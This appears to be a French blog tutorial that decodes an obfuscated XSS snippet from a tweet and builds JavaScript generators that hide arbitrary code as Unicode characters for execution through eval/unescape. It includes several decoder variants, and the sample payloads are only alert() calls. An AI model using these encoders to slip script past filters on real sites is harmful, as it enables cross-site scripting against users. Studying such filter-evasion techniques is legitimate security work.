# Décryptage d'un Tweet : Analyse et Génération de Payload en JavaScript

Récemment, en parcourant Twitter, j'ai rencontré un tweet intrigant de @renniepak contenant le code suivant :

Fait une fpnction qui réalise un decalage de bit en js pour decode XSS


```javascript

eval(unescape(escape`慬敲琨❲敮湩数慫✩`.replace(/u(..)/g,"$1%")))

Intrigué par ce snippet, j'ai décidé de le décortiquer étape par étape pour mieux comprendre son fonctionnement. De plus, j'ai implémenté un générateur de payload en JavaScript basé sur cette méthode d'encodage. Cet article détaille chaque étape de cette analyse et présente les outils développés.

## Décorticage du code initial

### Étape 1 : Encodage de la chaîne

Le code commence par **escape** (mécanismes permettant d'interpréter certains caractères spéciaux dans des chaînes de caractères) d'une chaîne de caractères incompréhensible.

**Code :**

```javascript
escape`慬敲琨❲敮湩数慫✩`
```

**Résulat :**

```plain-text
%u616C%u6572%u7428%u2772%u656E%u6E69%u6570%u616B%u2729
```

**Explication :** On obtient ici une séquence d'échappement Unicode de la forme `%uXXXX` où `XXXX` est une valeur hexadécimale représentant un charactère unicode.

### Étape 2 : Remplacement via une expression régulière

Ensuite, la chaîne encodée subit une transformation à l'aide d'une expression régulière :

**Code :**

```javascript
escape`慬敲琨❲敮湩数慫✩`.replace(/u(..)/g,"$1%")
ou
"%u616C%u6572%u7428%u2772%u656E%u6E69%u6570%u616B%u2729".replace(/u(..)/g,"$1%")
```

Après remplacement, le résultat est :

**Résulat :**

```plain-text
%61%6C%65%72%74%28%27%72%65%6E%6E%69%65%70%61%6B%27%29
```

**Explication :** L'expression régulière /u(..)/g cherche les séquences u suivies de deux caractères. Elle remplace chaque correspondance par les deux caractères capturés suivis d'un %. Cela convertit les séquences %uXXXX en %XX%XX.

### Étape 3 : Décodage de l'URL

La chaîne transformée est ensuite décodée avec unescape :

**Code :**

```javascript
unescape("%61%6C%65%72%74%28%27%72%65%6E%6E%69%65%70%61%6B%27%29")
ou 
unescape("%u616C%u6572%u7428%u2772%u656E%u6E69%u6570%u616B%u2729".replace(/u(..)/g,"$1%"))
ou
unescape(escape`慬敲琨❲敮湩数慫✩`.replace(/u(..)/g,"$1%"))
```

**Le résultat final :**

```javascript
alert('renniepak')
```

**Explication :** La fonction unescape décode les séquences %XX en caractères ASCII correspondants, révélant ainsi le code JavaScript alert('renniepak').

## Implémentation d'un générateur de payload en JavaScript

Pour automatiser ce processus d'encodage, j'ai développé un générateur de payload en JavaScript. Ce générateur inverse les étapes précédemment décrites pour encoder une chaîne de caractères de manière similaire.

```javascript
function renniepakEncode(chaine) {
    // Étape 1 : Obtenir les codes hexadécimaux de chaque caractère
    const codesHex = [];
    for (let i = 0; i < chaine.length; i++) {
        const hex = chaine.charCodeAt(i).toString(16).padStart(2, '0');
        codesHex.push(hex);
    }

    // Étape 2 : Regrouper les codes hexadécimaux par paires
    const pairesHex = [];
    for (let i = 0; i < codesHex.length; i += 2) {
        pairesHex.push(codesHex[i] + codesHex[i + 1]);
    }

    // Étape 3 : Convertir chaque paire en caractère Unicode
    let resultat = '';
    for (const paire of pairesHex) {
        const codePoint = parseInt(paire, 16);
        resultat += String.fromCharCode(codePoint);
    }
    return resultat;
}

function renniepakEncodeOnSteroid(payload) {
    // La meme chose que renniepakEncode().
    return payload
        .split('')
        // Pour chaque caractère, obtient son code Unicode `charCodeAt`, le convertit en hexadécimal `toString` et ajoute un hexa de bourrage si nécessaire
        .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
        .join('')
        // Diviser la chaîne hexa en segments de 4 chars
        .match(/.{1,4}/g)
        // Convertion de chaque segment de 4 chars hexa en unicode
        .map(hex => String.fromCharCode(parseInt(hex, 16)))
        .join('');
}


const ORIGINAL_PAYLOAD = "alert('raphzer')"
const ENCODED_PAYLOAD = renniepakEncodeOnSteroid(ORIGINAL_PAYLOAD);
const FINAL_PAYLAOD = 'unescape(escape`' + ENCODED_PAYLOAD + '`.replace(/u(..)/g,"$1%"))'

console.log("Original : " + ORIGINAL_PAYLOAD);
console.log("Renniepak encoded : " + ENCODED_PAYLOAD)
console.log('Final payload : eval(unescape(escape`' + ENCODED_PAYLOAD + '`.replace(/u(..)/g,"$1%")))')

eval(unescape(escape(ENCODED_PAYLOAD).replace(/u(..)/g,"$1%")))
```

### Explication des Étapes

1. Obtenir les Codes Hexadécimaux :
Chaque caractère de la chaîne est converti en son code hexadécimal correspondant à l'aide de charCodeAt et toString(16). Les codes hexadécimaux sont stockés dans le tableau codesHex.

2. Regrouper par Paires :
Les codes hexadécimaux sont regroupés par paires (deux par deux) pour former des séquences de quatre chiffres hexadécimaux, stockées dans pairesHex.

3. Conversion en Caractères Unicode :
Chaque paire hexadécimale est convertie en un caractère Unicode à l'aide de String.fromCharCode, formant ainsi la chaîne encodée.

## Custom paylaod generator

J'ai développé une variation du générateur qui ajoute du bourrage. Voici le code de cette variation :
Code de la Variation

```javascript
function forkOfRenniepakEncode(chaine) {
    return [...chaine] // opérateur spread pour transformer la chaîne en tableau de caractères.
        .map(char => {
            // Obtenir le code hexadécimal du caractère, puis compléter à 4 chiffres avec '99'
            const hexCode = char.charCodeAt(0).toString(16).padEnd(4, '99');
            // Convertir le code hexadécimal en un caractère Unicode
            return String.fromCharCode(parseInt(hexCode, 16));
        })
        .join('');
}

const ORIGINAL_PAYLOAD = "alert('raphzer')"
const ENCODED_PAYLOAD = forkOfRenniepakEncode(ORIGINAL_PAYLOAD);
const FINAL_PAYLAOD = 'unescape(escape`' + ENCODED_PAYLOAD + '`.replace(/u(..)/g,"$1%"))'

console.log("Original : " + ORIGINAL_PAYLOAD);
console.log("Renniepak encoded : " + ENCODED_PAYLOAD)
console.log('Final payload : unescape(escape`' + ENCODED_PAYLOAD + '`.replace(/%u(..)(..)/g,"%$1"))')

eval(unescape(escape(ENCODED_PAYLOAD).replace(/%u(..)(..)/g,"%$1")))
```

### Decodage du paylaod

```javascript
unescape(escape('瀀愀琀愀琀攀').replace(/%u(..)(..)/g,"%$1"))
```

**Explication :** Cette expression remplace les séquences %uXXYY par %XX, puis décode la chaîne encodée pour obtenir la chaîne originale.

### Rédaction de decodeur alternatif

```javascript
'瀀愀琀愀琀攀'.replace(/./g, c => String.fromCharCode(c.charCodeAt() >> 8))
Résultat : "patate"
```

Explication : Chaque caractère est transformé en son code ASCII en décalant les bits de 8 positions à droite, puis reconverti en caractère.
Exemple 3

```javascript
[...'瀀愀琀愀琀攀'].map(c => String.fromCharCode(c.charCodeAt() >> 8)).join('')
Résultat : "patate"
```

Explication : Cette version utilise l'opérateur de décomposition [... ] pour itérer sur chaque caractère, applique le décalage de bits, et rejoint les caractères résultants en une chaîne.
Exemple 4

```javascript
String.fromCharCode(...'瀀愀琀愀琀攀'.split('').map(c => c.charCodeAt() >> 8))
Résultat : "patate"
```

Explication : La chaîne est divisée en caractères individuels, chaque code de caractère est décalé, puis reconverti en caractères ASCII et recombiné.
Exemple 5

```javascript
'瀀愀琀愀琀攀'.replace(/./g, c => String.fromCharCode(c.charCodeAt() / 256))
Résultat : "patate"
```

Explication : Au lieu d'utiliser un décalage binaire, chaque code de caractère est divisé par 256 pour obtenir le code ASCII original.
Exemple 6

```javascript
String.fromCharCode(...[...'瀀愀琀愀琀攀'].map(c => c.charCodeAt() >>> 8))
Résultat : "patate"
```

Explication : Utilisation de l'opérateur de décalage à droite sans signe (>>>) pour obtenir le code ASCII original, puis conversion en caractères.
Exemple 7

```javascript
String.fromCharCode(...[... (function() { return '瀀' + '愀' + '琀' + '愀' + '琀'+ '攀'; })()].map(c => c.charCodeAt() >>> 8))
Résultat : "patate"
```